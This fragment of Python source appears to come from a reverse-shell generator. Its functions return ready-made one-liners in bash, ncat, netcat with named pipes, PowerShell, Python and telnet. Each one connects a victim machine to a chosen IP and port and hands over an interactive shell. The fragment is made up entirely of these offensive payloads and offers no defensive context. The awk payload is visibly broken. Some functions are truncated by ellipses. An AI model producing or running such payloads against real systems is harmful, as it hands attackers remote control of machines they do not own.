...
def awk_payload(ip, port):
    return f'awk "BEGIN{{cmd=| getline c; while(c){{c = (c|getline c); print c}}; close(cmd)}}" "/inet/tcp/{port}/{ip}/0/0"' #done

def bash_payload(ip, port):
    return f"""bash -i >& /dev/tcp/{ip}/{port} 0>&1"""

def bash_udp_payload(ip, port):
    return f"sh -i >& /dev/udp/{ip}/{port} 0>&1"

def ncat_payload(ip, port):
    return f"ncat {ip} {port} -e /bin/sh"

def nc_busybox_payload(ip, port):
    return f"rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"

def nc_openbsd_payload(ip, port):
    return f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
...
def powershell_payload(ip, port):
    return f'''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();
...
def python_payload(ip, port):
    return f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
import pty; pty.spawn("sh")'"""

def telnet_payload(ip, port):
    return f"TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | sh 1>$TF"
